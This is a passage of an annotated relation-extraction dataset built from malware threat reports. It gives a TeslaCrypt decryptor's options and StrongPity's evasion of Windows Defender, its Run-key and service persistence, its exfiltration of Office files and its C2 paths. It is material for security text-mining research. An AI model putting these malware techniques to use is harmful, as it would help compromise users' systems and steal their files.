"''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."], ["If", "it", "isn", "'", "t", "able", "to", "find", "and", "correctly", "parse", "the", "``", "key.dat", "''", "file", ",", "it", "will", "return", "an", "error", "and", "exit", "."], ["To", "use", "this", "tool", ",", "just", "copy", "the", "``", "key.dat", "''", "file", "into", "the", "tool", "'", "s", "directory", "and", "then", "specify", "either", "the", "encrypted", "file", "or", "a", "directory", "containing", "encrypted", "files", "."], ["Here", "is", "the", "list", "of", "command", "line", "options", ":", "/help", "-", "Show", "the", "help", "message/key", "-", "Manually", "specify", "the", "master", "key", "for", "the", "decryption", "(", "32", "bytes/64", "digits", ")", "/keyfile", "-", "Specify", "the", "path", "of", "the", "``", "key.dat", "''", "file", "used", "to", "recover", "the", "master", "key", "."], ["/file", "-", "Decrypt", "an", "encrypted", "file/dir", "-", "Decrypt", "all", "the", "``", ".ecc", "''", "files", "in", "the", "target", "directory", "and", "its", "subdirs/scanEntirePc", "-", "Decrypt", "``", ".ecc", "''", "files", "on", "the", "entire", "computer/KeepOriginal", "-", "Keep", "the", "original", "file", "(", "s", ")", "in", "the", "encryption", "process/deleteTeslaCrypt", "-", "Automatically", "kill", "and", "delete", "the", "TeslaCrypt", "dropper", "(", "if", "found", "active", "in", "the", "target", "system", ")", "Back", "up", "your", "encrypted", "files", "before", "you", "use", "this", "utility", "."], ["The", "user", "assumes", "all", "liability", "for", "the", "use", "of", "the", "tool", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [43, 43], "name": "key.dat", "pos": [4, 5], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [50, 50], "name": "master key", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "it", "pos": [1, 2], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [66, 66], "name": "key.dat", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "it", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "tool", "pos": [3, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [122, 122], "name": "key.dat", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "tool ' s directory", "pos": [14, 18], "index": "8_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 0, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 6, "t": 8}]}, {"title": "663-30", "sents": [["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."], ["If", "it", "isn", "'", "t", "able", "to", "find", "and", "correctly", "parse", "the", "``", "key.dat", "''", "file", ",", "it", "will", "return", "an", "error", "and", "exit", "."], ["To", "use", "this", "tool", ",", "just", "copy", "the", "``", "key.dat", "''", "file", "into", "the", "tool", "'", "s", "directory", "and", "then", "specify", "either", "the", "encrypted", "file", "or", "a", "directory", "containing", "encrypted", "files", "."], ["Here", "is", "the", "list", "of", "command", "line", "options", ":", "/help", "-", "Show", "the", "help", "message/key", "-", "Manually", "specify", "the", "master", "key", "for", "the", "decryption", "(", "32", "bytes/64", "digits", ")", "/keyfile", "-", "Specify", "the", "path", "of", "the", "``", "key.dat", "''", "file", "used", "to", "recover", "the", "master", "key", "."], ["/file", "-", "Decrypt", "an", "encrypted", "file/dir", "-", "Decrypt", "all", "the", "``", ".ecc", "''", "files", "in", "the", "target", "directory", "and", "its", "subdirs/scanEntirePc", "-", "Decrypt", "``", ".ecc", "''", "files", "on", "the", "entire", "computer/KeepOriginal", "-", "Keep", "the", "original", "file", "(", "s", ")", "in", "the", "encryption", "process/deleteTeslaCrypt", "-", "Automatically", "kill", "and", "delete", "the", "TeslaCrypt", "dropper", "(", "if", "found", "active", "in", "the", "target", "system", ")", "Back", "up", "your", "encrypted", "files", "before", "you", "use", "this", "utility", "."], ["The", "user", "assumes", "all", "liability", "for", "the", "use", "of", "the", "tool", "."], ["79fhdm16.com", "has", "also", "added", "a", "behavioral", "indicator", "to", "identify", "TeslaCrypt", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [4, 4], "name": "key.dat", "pos": [4, 5], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [11, 11], "name": "master key", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "it", "pos": [1, 2], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [27, 27], "name": "key.dat", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "it", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "tool", "pos": [3, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [83, 83], "name": "key.dat", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [88, 88], "name": "tool ' s directory", "pos": [14, 18], "index": "8_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 7}, {"r": "CO", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 6, "t": 8}]}, {"title": "641-0", "sents": [["The", "trojanized", "setup", "will", "install", "the", "malware", "and", "the", "legitimate", "application", ",", "which", "is", "a", "good", "way", "to", "disguise", "its", "activities", "."], ["In", "some", "cases", ",", "it", "will", "reconfigure", "Windows", "Defender", "before", "dropping", "the", "malware", "to", "prevent", "detection", "."], ["The", "malware", "will", "exfiltrate", "any", "Microsoft", "Office", "file", "it", "encounters", "on", "the", "system", "."], ["When", "the", "targeted", "users", "tried", "to", "download", "a", "legitimate", "application", "on", "the", "official", "website", ",", "the", "ISP", "performs", "an", "HTTP", "redirect", "."], ["It", "is", "interesting", "to", "note", "that", "this", "threat", "actor", "uses", "HTTPS", "on", "the", "C2", "."], ["Main", "differences", "between", "StrongPity2", "and", "StrongPity3", "StrongPity3", "is", "the", "evolution", "of", "StrongPity2", ",", "with", "a", "few", "differences", "."], ["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "trojanized", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "malware", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "application", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "it", "pos": [4, 5], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "Windows Defender", "pos": [7, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "malware", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "malware", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "file", "pos": [7, 8], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [56, 56], "name": "users", "pos": [3, 4], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [62, 62], "name": "application", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "ISP", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [72, 72], "name": "HTTP redirect", "pos": [19, 21], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [83, 83], "name": "actor", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "HTTPS", "pos": [10, 11], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [88, 88], "name": "C2", "pos": [13, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [93, 93], "name": "StrongPity2", "pos": [3, 4], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [95, 95], "name": "StrongPity3", "pos": [5, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "StrongPity3", "pos": [6, 7], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "StrongPity2", "pos": [11, 12], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [113, 113], "name": "libcurl", "pos": [5, 6], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [118, 118], "name": "winhttp", "pos": [10, 11], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [124, 124], "name": "C2", "pos": [16, 17], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [131, 131], "name": "registry", "pos": [5, 6], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [146, 146], "name": "service", "pos": [20, 21], "index": "23_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [4], "h": 12, "t": 13}, {"r": "ST", "evidence": [4], "h": 12, "t": 14}, {"r": "RF", "evidence": [4], "h": 12, "t": 14}, {"r": "ST", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "RF", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "ST", "evidence": [5, 6], "h": 18, "t": 21}, {"r": "RF", "evidence": [5, 6], "h": 18, "t": 21}, {"r": "CO", "evidence": [5], "h": 15, "t": 18}, {"r": "CO", "evidence": [5], "h": 16, "t": 17}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "ST", "evidence": [6], "h": 20, "t": 21}, {"r": "RF", "evidence": [6], "h": 20, "t": 21}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "WR", "evidence": [6, 7], "h": 20, "t": 22}]}, {"title": "641-1", "sents": [["In", "some", "cases", ",", "it", "will", "reconfigure", "Windows", "Defender", "before", "dropping", "the", "malware", "to", "prevent", "detection", "."], ["The", "malware", "will", "exfiltrate", "any", "Microsoft", "Office", "file", "it", "encounters", "on", "the", "system", "."], ["When", "the", "targeted", "users", "tried", "to", "download", "a", "legitimate", "application", "on", "the", "official", "website", ",", "the", "ISP", "performs", "an", "HTTP", "redirect", "."], ["It", "is", "interesting", "to", "note", "that", "this", "threat", "actor", "uses", "HTTPS", "on", "the", "C2", "."], ["Main", "differences", "between", "StrongPity2", "and", "StrongPity3", "StrongPity3", "is", "the", "evolution", "of", "StrongPity2", ",", "with", "a", "few", "differences", "."], ["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "it", "pos": [4, 5], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [7, 7], "name": "Windows Defender", "pos": [7, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "malware", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "malware", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "file", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [34, 34], "name": "users", "pos": [3, 4], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [40, 40], "name": "application", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "ISP", "pos": [16, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "HTTP redirect", "pos": [19, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "actor", "pos": [8, 9], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "HTTPS", "pos": [10, 11], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [66, 66], "name": "C2", "pos": [13, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "StrongPity2", "pos": [3, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [73, 73], "name": "StrongPity3", "pos": [5, 6], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "StrongPity3", "pos": [6, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "StrongPity2", "pos": [11, 12], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "libcurl", "pos": [5, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "winhttp", "pos": [10, 11], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [102, 102], "name": "C2", "pos": [16, 17], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [109, 109], "name": "registry", "pos": [5, 6], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [124, 124], "name": "service", "pos": [20, 21], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [127, 127], "name": "service", "pos": [1, 2], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "ST", "evidence": [3], "h": 9, "t": 11}, {"r": "RF", "evidence": [3], "h": 9, "t": 11}, {"r": "ST", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "RF", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "ST", "evidence": [4, 5], "h": 15, "t": 18}, {"r": "RF", "evidence": [4, 5], "h": 15, "t": 18}, {"r": "CO", "evidence": [4], "h": 12, "t": 15}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "ST", "evidence": [5], "h": 16, "t": 18}, {"r": "RF", "evidence": [5], "h": 16, "t": 18}, {"r": "ST", "evidence": [5], "h": 17, "t": 18}, {"r": "RF", "evidence": [5], "h": 17, "t": 18}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 21}]}, {"title": "641-2", "sents": [["The", "malware", "will", "exfiltrate", "any", "Microsoft", "Office", "file", "it", "encounters", "on", "the", "system", "."], ["When", "the", "targeted", "users", "tried", "to", "download", "a", "legitimate", "application", "on", "the", "official", "website", ",", "the", "ISP", "performs", "an", "HTTP", "redirect", "."], ["It", "is", "interesting", "to", "note", "that", "this", "threat", "actor", "uses", "HTTPS", "on", "the", "C2", "."], ["Main", "differences", "between", "StrongPity2", "and", "StrongPity3", "StrongPity3", "is", "the", "evolution", "of", "StrongPity2", ",", "with", "a", "few", "differences", "."], ["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "file", "pos": [7, 8], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [17, 17], "name": "users", "pos": [3, 4], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [23, 23], "name": "application", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "ISP", "pos": [16, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "HTTP redirect", "pos": [19, 21], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "actor", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "HTTPS", "pos": [10, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [49, 49], "name": "C2", "pos": [13, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "StrongPity2", "pos": [3, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [56, 56], "name": "StrongPity3", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "StrongPity3", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "StrongPity2", "pos": [11, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "libcurl", "pos": [5, 6], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "winhttp", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [85, 85], "name": "C2", "pos": [16, 17], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [92, 92], "name": "registry", "pos": [5, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [107, 107], "name": "service", "pos": [20, 21], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [110, 110], "name": "service", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [121, 121], "name": "executable", "pos": [2, 3], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [129, 129], "name": "C2 contact module", "pos": [10, 13], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "ST", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "RF", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "ST", "evidence": [3, 4], "h": 12, "t": 15}, {"r": "RF", "evidence": [3, 4], "h": 12, "t": 15}, {"r": "CO", "evidence": [3], "h": 9, "t": 12}, {"r": "CO", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [4], "h": 13, "t": 15}, {"r": "RF", "evidence": [4], "h": 13, "t": 15}, {"r": "ST", "evidence": [4], "h": 14, "t": 15}, {"r": "RF", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "RD", "evidence": [5, 6, 7], "t": 16, "h": 19}, {"r": "RD", "evidence": [5, 6, 7], "t": 16, "h": 19}, {"r": "WR", "evidence": [5, 6, 7], "t": 16, "h": 19}, {"r": "FR", "evidence": [7], "h": 19, "t": 20}]}, {"title": "641-3", "sents": [["When", "the", "targeted", "users", "tried", "to", "download", "a", "legitimate", "application", "on", "the", "official", "website", ",", "the", "ISP", "performs", "an", "HTTP", "redirect", "."], ["It", "is", "interesting", "to", "note", "that", "this", "threat", "actor", "uses", "HTTPS", "on", "the", "C2", "."], ["Main", "differences", "between", "StrongPity2", "and", "StrongPity3", "StrongPity3", "is", "the", "evolution", "of", "StrongPity2", ",", "with", "a", "few", "differences", "."], ["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [3, 3], "name": "users", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "application", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "ISP", "pos": [16, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "HTTP redirect", "pos": [19, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "actor", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "HTTPS", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [35, 35], "name": "C2", "pos": [13, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "StrongPity2", "pos": [3, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "StrongPity3", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "StrongPity3", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "StrongPity2", "pos": [11, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "libcurl", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "winhttp", "pos": [10, 11], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "C2", "pos": [16, 17], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [78, 78], "name": "registry", "pos": [5, 6], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "service", "pos": [20, 21], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "service", "pos": [1, 2], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "executable", "pos": [2, 3], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [115, 115], "name": "C2 contact module", "pos": [10, 13], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [133, 133], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "RF", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "ST", "evidence": [2, 3], "h": 10, "t": 13}, {"r": "RF", "evidence": [2, 3], "h": 10, "t": 13}, {"r": "CO", "evidence": [2], "h": 7, "t": 10}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 11, "t": 13}, {"r": "RF", "evidence": [3], "h": 11, "t": 13}, {"r": "ST", "evidence": [3], "h": 12, "t": 13}, {"r": "RF", "evidence": [3], "h": 12, "t": 13}, {"r": "RD", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "RD", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "WR", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 15, "t": 16}, {"r": "RD", "evidence": [4, 5, 6], "t": 14, "h": 17}, {"r": "RD", "evidence": [4, 5, 6], "t": 14, "h": 17}, {"r": "WR", "evidence": [4, 5, 6], "t": 14, "h": 17}, {"r": "FR", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 19}]}, {"title": "641-4", "sents": [["It", "is", "interesting", "to", "note", "that", "this", "threat", "actor", "uses", "HTTPS", "on", "the", "C2", "."], ["Main", "differences", "between", "StrongPity2", "and", "StrongPity3", "StrongPity3", "is", "the", "evolution", "of", "StrongPity2", ",", "with", "a", "few", "differences", "."], ["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "actor", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "HTTPS", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "C2", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "StrongPity2", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "StrongPity3", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "StrongPity3", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "StrongPity2", "pos": [11, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": 